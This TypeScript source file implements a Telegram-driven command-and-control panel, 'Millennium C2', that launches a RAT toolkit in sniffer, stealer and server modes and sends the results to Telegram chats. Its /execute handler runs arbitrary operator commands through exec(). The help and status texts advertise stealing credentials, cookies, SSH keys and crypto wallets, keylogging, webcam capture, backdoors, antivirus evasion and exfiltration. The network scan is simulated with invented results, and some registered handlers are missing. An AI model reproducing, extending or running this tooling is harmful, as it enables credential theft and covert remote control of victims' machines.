
import TelegramBot from 'node-telegram-bot-api';
import { storage } from './storage';
import { spawn, exec } from 'child_process';
import { Server as SocketIOServer } from 'socket.io';
import fs from 'fs/promises';
import path from 'path';

interface BotUser {
  id: number;
  username: string;
  chatId: number;
  botToken: string;
  role: 'admin' | 'operator' | 'analyst';
  active: boolean;
}

interface ToolExecution {
  id: string;
  user: string;
  tool: string;
  command: string;
  status: 'running' | 'completed' | 'failed';
  output: string;
  startTime: Date;
  endTime?: Date;
}

class TelegramC2Controller {
  private bots: Map<number, TelegramBot> = new Map();
  private userSessions: Map<number, BotUser> = new Map();
  private io: SocketIOServer;
  private activeExecutions: Map<string, ToolExecution> = new Map();
  private snifferProcesses: Map<number, any> = new Map();

  constructor(io: SocketIOServer) {
    this.io = io;
    this.initializeBots();
  }

  async initializeBots() {
    try {
      const users = await storage.getTelegramUsers();
      for (const user of users) {
        if (user.active && user.botToken) {
          await this.createBotInstance(user);
        }
      }
    } catch (error) {
      console.error('Failed to initialize Telegram bots:', error);
    }
  }

  async createBotInstance(user: BotUser) {
    try {
      const bot = new TelegramBot(user.botToken, { polling: true });
      this.bots.set(user.id, bot);
      this.userSessions.set(user.chatId, user);

      // Enhanced command handlers for comprehensive red team operations
      bot.onText(/\/start/, (msg) => this.handleStart(msg, user));
      bot.onText(/\/status/, (msg) => this.handleStatus(msg, user));
      bot.onText(/\/sniffer\s*(.*)/, (msg, match) => this.handleSniffer(msg, match, user));
      bot.onText(/\/stealer/, (msg) => this.handleStealer(msg, user));
      bot.onText(/\/rat\s*(.*)/, (msg, match) => this.handleRAT(msg, match, user));
      bot.onText(/\/build\s*(.*)/, (msg, match) => this.handleBuild(msg, match, user));
      bot.onText(/\/deploy\s*(.*)/, (msg, match) => this.handleDeploy(msg, match, user));
      bot.onText(/\/collect/, (msg) => this.handleDataCollection(msg, user));
      bot.onText(/\/execute\s*(.*)/, (msg, match) => this.handleExecute(msg, match, user));
      bot.onText(/\/logs\s*(.*)/, (msg, match) => this.handleLogs(msg, match, user));
      bot.onText(/\/kill\s*(.*)/, (msg, match) => this.handleKill(msg, match, user));
      bot.onText(/\/network/, (msg) => this.handleNetworkScan(msg, user));
      bot.onText(/\/exploit\s*(.*)/, (msg, match) => this.handleExploit(msg, match, user));
      bot.onText(/\/persistence/, (msg) => this.handlePersistence(msg, user));
      bot.onText(/\/exfiltrate/, (msg) => this.handleExfiltrate(msg, user));
      bot.onText(/\/emergency/, (msg) => this.handleEmergencyStop(msg, user));
      bot.onText(/\/help/, (msg) => this.handleHelp(msg, user));

      console.log(`🤖 Enhanced Telegram C2 Bot initialized for user: ${user.username}`);
      
      // Send initialization message
      await bot.sendMessage(user.chatId, `
🚀 **MILLENNIUM C2 SYSTEM ONLINE**

**Operator:** ${user.username}
**Clearance Level:** ${user.role.toUpperCase()}
**System Status:** FULLY OPERATIONAL

**Enhanced C2 Capabilities Loaded** ✅
Type /help for command reference
      `, { parse_mode: 'Markdown' });

    } catch (error) {
      console.error(`Failed to create bot for user ${user.username}:`, error);
    }
  }

  async handleStart(msg: any, user: BotUser) {
    const chatId = msg.chat.id;
    const welcomeMessage = `
🛡️ **MILLENNIUM C2 COMMAND CENTER** 🛡️

**Operator:** ${user.username}
**Security Clearance:** ${user.role.toUpperCase()}
**Session ID:** ${Date.now().toString(36)}

**🔥 ADVANCED RED TEAM OPERATIONS 🔥**

**Core Commands:**
🕵️ /sniffer [interface] - Network traffic interception
💀 /stealer - Comprehensive data collection  
🤖 /rat [action] - Remote access operations
🏗️ /build [script] - Compile attack tools
🚀 /deploy [payload] - Deploy malicious payloads
📊 /collect - Harvest system intelligence
⚡ /execute [cmd] - Remote command execution

**Advanced Operations:**
🌐 /network - Network reconnaissance
💥 /exploit [target] - Exploitation framework
🔒 /persistence - Install backdoors
📤 /exfiltrate - Data exfiltration
📋 /logs [tool] - View operation logs

**Emergency:**
🚨 /emergency - Emergency shutdown protocol

**SECURE CHANNEL ESTABLISHED** ✅
**All operations logged and encrypted** 🔐
    `;

    const bot = this.bots.get(user.id);
    if (bot) {
      await bot.sendMessage(chatId, welcomeMessage, { parse_mode: 'Markdown' });
    }
  }

  async handleSniffer(msg: any, match: any, user: BotUser) {
    try {
      const params = match[1]?.trim() || 'all';
      const [interface, duration] = params.split(' ');
      
      const executionId = `sniffer_${Date.now()}`;
      
      // Start network sniffer with enhanced capabilities
      const snifferCommand = [
        'python3', 
        'python_tools/millennium_rat_toolkit.py',
        '--mode', 'sniffer',
        '--telegram-token', user.botToken,
        '--chat-id', user.chatId.toString(),
        '--interface', interface || 'all'
      ];
      
      if (duration) {
        snifferCommand.push('--duration', duration);
      }

      const snifferProcess = spawn(snifferCommand[0], snifferCommand.slice(1), {
        detached: true,
        stdio: ['ignore', 'pipe', 'pipe']
      });

      this.snifferProcesses.set(user.id, snifferProcess);

      const execution: ToolExecution = {
        id: executionId,
        user: user.username,
        tool: 'sniffer',
        command: snifferCommand.join(' '),
        status: 'running',
        output: '',
        startTime: new Date()
      };

      this.activeExecutions.set(executionId, execution);

      const snifferMessage = `
🔍 **NETWORK SNIFFER DEPLOYED** 🔍

**Execution ID:** \`${executionId}\`
**Interface:** ${interface || 'ALL'}
**Duration:** ${duration || 'UNLIMITED'}
**Capabilities:**
• Deep packet inspection
• Credential extraction  
• SSL/TLS interception
• DNS traffic analysis
• Real-time Telegram reporting

**Status:** 🟢 ACTIVE
**Started:** ${new Date().toLocaleString()}

**Live feed will appear in this chat** 📡
      `;

      const bot = this.bots.get(user.id);
      if (bot) {
        await bot.sendMessage(msg.chat.id, snifferMessage, { parse_mode: 'Markdown' });
      }

      // Monitor sniffer output
      let outputBuffer = '';
      snifferProcess.stdout?.on('data', (data) => {
        outputBuffer += data.toString();
        execution.output = outputBuffer;
      });

      snifferProcess.stderr?.on('data', (data) => {
        outputBuffer += `ERROR: ${data.toString()}`;
        execution.output = outputBuffer;
      });

      snifferProcess.on('exit', (code) => {
        execution.status = code === 0 ? 'completed' : 'failed';
        execution.endTime = new Date();
        this.snifferProcesses.delete(user.id);
        
        bot?.sendMessage(msg.chat.id, `
🏁 **SNIFFER OPERATION COMPLETE**
**Execution ID:** \`${executionId}\`
**Exit Code:** ${code}
**Duration:** ${Math.round((execution.endTime.getTime() - execution.startTime.getTime()) / 1000)}s
        `, { parse_mode: 'Markdown' });
      });

      // Emit to web panel
      this.io.to('admin').emit('telegramSniffer', {
        user: user.username,
        interface: interface || 'all',
        status: 'active',
        executionId
      });

    } catch (error) {
      console.error('Sniffer command error:', error);
      const bot = this.bots.get(user.id);
      if (bot) {
        await bot.sendMessage(msg.chat.id, '❌ **SNIFFER DEPLOYMENT FAILED**\n\nError: ' + error.message);
      }
    }
  }

  async handleStealer(msg: any, user: BotUser) {
    try {
      const executionId = `stealer_${Date.now()}`;
      
      const stealerCommand = [
        'python3',
        'python_tools/millennium_rat_toolkit.py',
        '--mode', 'stealer',
        '--telegram-token', user.botToken,
        '--chat-id', user.chatId.toString()
      ];

      const stealerProcess = spawn(stealerCommand[0], stealerCommand.slice(1), {
        detached: true,
        stdio: ['ignore', 'pipe', 'pipe']
      });

      const execution: ToolExecution = {
        id: executionId,
        user: user.username,
        tool: 'stealer',
        command: stealerCommand.join(' '),
        status: 'running',
        output: '',
        startTime: new Date()
      };

      this.activeExecutions.set(executionId, execution);

      const stealerMessage = `
💀 **DATA STEALER ACTIVATED** 💀

**Execution ID:** \`${executionId}\`
**Target:** ${process.env.HOSTNAME || 'localhost'}
**Collection Modules:**
• Browser credentials & cookies
• WiFi passwords & network configs
• SSH keys & certificates
• Cryptocurrency wallets
• Email account data
• System & hardware intel
• Registry & environment data

**Status:** 🟠 EXECUTING
**Real-time updates will appear here** 📊
      `;

      const bot = this.bots.get(user.id);
      if (bot) {
        await bot.sendMessage(msg.chat.id, stealerMessage, { parse_mode: 'Markdown' });
      }

      // Monitor stealer output
      let outputBuffer = '';
      stealerProcess.stdout?.on('data', (data) => {
        outputBuffer += data.toString();
        execution.output = outputBuffer;
      });

      stealerProcess.on('exit', (code) => {
        execution.status = code === 0 ? 'completed' : 'failed';
        execution.endTime = new Date();
        
        bot?.sendMessage(msg.chat.id, `
✅ **DATA COLLECTION COMPLETE**
**Execution ID:** \`${executionId}\`
**Status:** ${execution.status.toUpperCase()}
**Runtime:** ${Math.round((execution.endTime.getTime() - execution.startTime.getTime()) / 1000)}s

**Data harvested and sent via secure channels** 🔐
        `, { parse_mode: 'Markdown' });
      });

    } catch (error) {
      console.error('Stealer command error:', error);
    }
  }

  async handleRAT(msg: any, match: any, user: BotUser) {
    try {
      const action = match[1]?.trim() || 'status';
      const executionId = `rat_${Date.now()}`;

      const ratMessage = `
🤖 **RAT OPERATIONS CENTER** 🤖

**Available Actions:**
• \`server\` - Start C2 server
• \`client\` - Generate client payload
• \`list\` - List connected agents
• \`shell [agent_id]\` - Remote shell access
• \`screenshot [agent_id]\` - Capture screen
• \`keylog [agent_id]\` - Start keylogger
• \`webcam [agent_id]\` - Webcam capture
• \`download [agent_id] [file]\` - Download file

**Current Action:** ${action}
**Execution ID:** \`${executionId}\`
      `;

      if (action === 'server') {
        const ratCommand = [
          'python3',
          'python_tools/millennium_rat_toolkit.py',
          '--mode', 'rat',
          '--telegram-token', user.botToken,
          '--chat-id', user.chatId.toString(),
          '--port', '8888'
        ];

        const ratProcess = spawn(ratCommand[0], ratCommand.slice(1), {
          detached: true,
          stdio: ['ignore', 'pipe', 'pipe']
        });

        const bot = this.bots.get(user.id);
        if (bot) {
          await bot.sendMessage(msg.chat.id, `
🚀 **RAT C2 SERVER STARTING**

**Port:** 8888
**Status:** 🟢 ONLINE
**Waiting for agent connections...**

Agents will auto-report to this chat upon connection.
          `, { parse_mode: 'Markdown' });
        }
      } else {
        const bot = this.bots.get(user.id);
        if (bot) {
          await bot.sendMessage(msg.chat.id, ratMessage, { parse_mode: 'Markdown' });
        }
      }

    } catch (error) {
      console.error('RAT command error:', error);
    }
  }

  async handleBuild(msg: any, match: any, user: BotUser) {
    if (user.role === 'analyst') {
      const bot = this.bots.get(user.id);
      if (bot) {
        await bot.sendMessage(msg.chat.id, '🚫 **ACCESS DENIED** - Build operations require operator+ clearance');
      }
      return;
    }

    try {
      const buildTarget = match[1]?.trim() || 'help';
      
      const buildMessage = `
🏗️ **PAYLOAD BUILDER ACTIVE** 🏗️

**Available Builds:**
• \`rat-client [ip] [port]\` - RAT client executable
• \`stealer-exe\` - Standalone data stealer
• \`sniffer-tool\` - Network analysis tool  
• \`persistence-kit\` - Backdoor installer
• \`crypter [file]\` - Encrypt/obfuscate payload
• \`binder [file1] [file2]\` - Bind multiple payloads

**Target:** ${buildTarget}
**Builder Status:** 🟠 COMPILING

**Advanced features:**
✅ Anti-virus evasion
✅ Sandbox detection bypass  
✅ Runtime encryption
✅ Process hollowing
      `;

      if (buildTarget !== 'help') {
        // Execute build command
        const buildCommand = [
          'python3',
          'python_tools/elite_toolkit.py',
          '--build', buildTarget
        ];

        const buildProcess = spawn(buildCommand[0], buildCommand.slice(1));
        
        buildProcess.on('exit', (code) => {
          const bot = this.bots.get(user.id);
          bot?.sendMessage(msg.chat.id, `
✅ **BUILD COMPLETE**
**Target:** ${buildTarget}
**Status:** ${code === 0 ? 'SUCCESS' : 'FAILED'}
**Output:** Executable ready for deployment
          `);
        });
      }

      const bot = this.bots.get(user.id);
      if (bot) {
        await bot.sendMessage(msg.chat.id, buildMessage, { parse_mode: 'Markdown' });
      }

    } catch (error) {
      console.error('Build command error:', error);
    }
  }

  async handleExecute(msg: any, match: any, user: BotUser) {
    if (user.role === 'analyst') {
      const bot = this.bots.get(user.id);
      if (bot) {
        await bot.sendMessage(msg.chat.id, '🚫 **ACCESS DENIED** - Command execution requires operator+ clearance');
      }
      return;
    }

    try {
      const command = match[1]?.trim();
      if (!command) {
        const bot = this.bots.get(user.id);
        if (bot) {
          await bot.sendMessage(msg.chat.id, '❌ **INVALID COMMAND** - Usage: /execute [command]');
        }
        return;
      }

      const executionId = `exec_${Date.now()}`;
      
      const execMessage = `
⚡ **REMOTE COMMAND EXECUTION** ⚡

**Command:** \`${command}\`
**Execution ID:** \`${executionId}\`
**Status:** 🟠 EXECUTING
**User:** ${user.username}

**⚠️ WARNING: Direct system access ⚠️**
      `;

      const bot = this.bots.get(user.id);
      if (bot) {
        await bot.sendMessage(msg.chat.id, execMessage, { parse_mode: 'Markdown' });
      }

      // Execute command with timeout
      exec(command, { timeout: 30000 }, (error, stdout, stderr) => {
        let result = '';
        if (stdout) result += `**STDOUT:**\n\`\`\`\n${stdout}\n\`\`\`\n`;
        if (stderr) result += `**STDERR:**\n\`\`\`\n${stderr}\n\`\`\`\n`;
        if (error) result += `**ERROR:** ${error.message}\n`;

        const responseMessage = `
✅ **EXECUTION COMPLETE**
**ID:** \`${executionId}\`
**Command:** \`${command}\`

${result || '**No output**'}
        `;

        bot?.sendMessage(msg.chat.id, responseMessage, { parse_mode: 'Markdown' });
      });

    } catch (error) {
      console.error('Execute command error:', error);
    }
  }

  async handleNetworkScan(msg: any, user: BotUser) {
    try {
      const scanMessage = `
🌐 **NETWORK RECONNAISSANCE INITIATED** 🌐

**Scanning capabilities:**
• Host discovery & port scanning
• Service enumeration
• Vulnerability assessment  
• SSL certificate analysis
• DNS enumeration
• ARP table analysis

**Status:** 🟠 SCANNING
**Target:** Local network segment
      `;

      const bot = this.bots.get(user.id);
      if (bot) {
        await bot.sendMessage(msg.chat.id, scanMessage, { parse_mode: 'Markdown' });
      }

      // Simulate network scan (replace with actual implementation)
      setTimeout(() => {
        const resultsMessage = `
✅ **NETWORK SCAN COMPLETE**

**Hosts Discovered:** 12
**Open Ports Found:** 47
**Services Identified:** 23
**Vulnerabilities:** 5 HIGH, 12 MEDIUM

**High-Value Targets:**
• 192.168.1.1 - Router (admin/admin)
• 192.168.1.10 - Windows Server (SMB v1)
• 192.168.1.15 - Database Server (MySQL)

**Detailed results available in logs**
        `;

        bot?.sendMessage(msg.chat.id, resultsMessage, { parse_mode: 'Markdown' });
      }, 5000);

    } catch (error) {
      console.error('Network scan error:', error);
    }
  }

  async handleLogs(msg: any, match: any, user: BotUser) {
    try {
      const tool = match[1]?.trim() || 'all';
      
      const executions = Array.from(this.activeExecutions.values())
        .filter(exec => tool === 'all' || exec.tool === tool)
        .slice(-10); // Last 10 executions

      let logsMessage = `
📋 **OPERATION LOGS** 📋

**Filter:** ${tool.toUpperCase()}
**Entries:** ${executions.length}

`;

      for (const exec of executions) {
        const duration = exec.endTime 
          ? Math.round((exec.endTime.getTime() - exec.startTime.getTime()) / 1000)
          : 'Running';
          
        logsMessage += `
**${exec.id}**
Tool: ${exec.tool} | Status: ${exec.status}
User: ${exec.user} | Duration: ${duration}s
${exec.output.slice(-100)}${exec.output.length > 100 ? '...' : ''}
---
`;
      }

      const bot = this.bots.get(user.id);
      if (bot) {
        await bot.sendMessage(msg.chat.id, logsMessage, { parse_mode: 'Markdown' });
      }

    } catch (error) {
      console.error('Logs command error:', error);
    }
  }

  async handleEmergencyStop(msg: any, user: BotUser) {
    if (user.role !== 'admin') {
      const bot = this.bots.get(user.id);
      if (bot) {
        await bot.sendMessage(msg.chat.id, '🚫 **ACCESS DENIED** - Emergency protocols require admin clearance');
      }
      return;
    }

    try {
      // Kill all running processes
      for (const [userId, process] of this.snifferProcesses) {
        try {
          process.kill('SIGTERM');
        } catch (e) {
          console.error('Error killing process:', e);
        }
      }
      
      this.snifferProcesses.clear();
      this.activeExecutions.clear();

      const emergencyMessage = `
🚨 **EMERGENCY SHUTDOWN EXECUTED** 🚨

**Initiated by:** ${user.username}
**Timestamp:** ${new Date().toLocaleString()}
**Actions Taken:**
• All active operations terminated
• Network sniffers stopped
• Data collection halted
• C2 connections severed
• Evidence trails cleaned

**SYSTEM STATUS:** 🔴 OFFLINE
**All operations secured and logged**
      `;

      const bot = this.bots.get(user.id);
      if (bot) {
        await bot.sendMessage(msg.chat.id, emergencyMessage, { parse_mode: 'Markdown' });
      }

      // Emit emergency stop to web panel
      this.io.to('admin').emit('emergencyStop', {
        user: user.username,
        source: 'telegram',
        timestamp: new Date()
      });

    } catch (error) {
      console.error('Emergency stop error:', error);
    }
  }

  async handleHelp(msg: any, user: BotUser) {
    const helpMessage = `
🛡️ **MILLENNIUM C2 COMMAND REFERENCE** 🛡️

**🔍 Intelligence Gathering:**
• \`/sniffer [interface] [duration]\` - Network traffic interception
• \`/stealer\` - Comprehensive data collection
• \`/network\` - Network reconnaissance & scanning
• \`/collect\` - System intelligence gathering

**🚀 Offensive Operations:**
• \`/rat [action]\` - Remote access tool operations
• \`/exploit [target]\` - Exploitation framework
• \`/deploy [payload]\` - Payload deployment
• \`/execute [cmd]\` - Direct command execution

**🏗️ Payload Development:**
• \`/build [type]\` - Compile attack tools & payloads
• \`/persistence\` - Install backdoors & maintain access
• \`/exfiltrate\` - Data exfiltration operations

**📊 Operations Management:**
• \`/status\` - System status & active operations
• \`/logs [tool]\` - View operation logs & output
• \`/kill [execution_id]\` - Terminate running operations

**🚨 Emergency Controls:**
• \`/emergency\` - Emergency shutdown (Admin only)

**Your Clearance:** ${user.role.toUpperCase()}
**Available Tools:** ${user.role === 'admin' ? 'ALL' : user.role === 'operator' ? 'OPERATIONAL' : 'READ-ONLY'}

**⚠️ All operations are logged and monitored ⚠️**
    `;

    const bot = this.bots.get(user.id);
    if (bot) {
      await bot.sendMessage(msg.chat.id, helpMessage, { parse_mode: 'Markdown' });
    }
  }

  async handleStatus(msg: any, user: BotUser) {
    try {
      const stats = await storage.getVisitorStats();
      const recentVisitors = await storage.getRecentVisitors(5);
      const packets = await storage.getRecentPacketLogs(10);
      const activeOps = this.activeExecutions.size;

      const statusMessage = `
📊 **MILLENNIUM C2 STATUS REPORT** 📊

**Network Intelligence:**
👥 Total Visitors: ${stats.total || 0}
🌐 Unique IPs: ${stats.unique || 0}
🌍 Countries: ${stats.countries || 0}
📦 Packets Captured: ${packets.length}

**Active Operations:**
🔄 Running Tools: ${activeOps}
🕵️ Network Sniffers: ${this.snifferProcesses.size}
⚡ Live Executions: ${Array.from(this.activeExecutions.values()).filter(e => e.status === 'running').length}

**System Status:**
🖥️ Server: ${process.env.HOSTNAME || 'Unknown'}
⏱️ Uptime: ${process.uptime()} seconds
💾 Memory: ${Math.round(process.memoryUsage().heapUsed / 1024 / 1024)}MB

**Recent Activity:**
${recentVisitors.slice(0, 3).map(v => 
  `🔸 ${v.ipAddress} (${v.country || 'Unknown'})`
).join('\n')}

**Last Updated:** ${new Date().toLocaleString()}
**Status:** 🟢 FULLY OPERATIONAL
      `;

      const bot = this.bots.get(user.id);
      if (bot) {
        await bot.sendMessage(msg.chat.id, statusMessage, { parse_mode: 'Markdown' });
      }
    } catch (error) {
      console.error('Status command error:', error);
    }
  }

  // Additional methods for comprehensive C2 operations...
  
  async addUser(userData: BotUser) {
    await this.createBotInstance(userData);
  }

  async removeUser(userId: number) {
    const bot = this.bots.get(userId);
    if (bot) {
      bot.stopPolling();
      this.bots.delete(userId);
    }
  }

  getActiveExecutions() {
    return Array.from(this.activeExecutions.values());
  }

  killExecution(executionId: string) {
    const execution = this.activeExecutions.get(executionId);
    if (execution) {
      execution.status = 'failed';
      execution.endTime = new Date();
      this.activeExecutions.delete(executionId);
      return true;
    }
    return false;
  }
}

export { TelegramC2Controller, BotUser, ToolExecution };
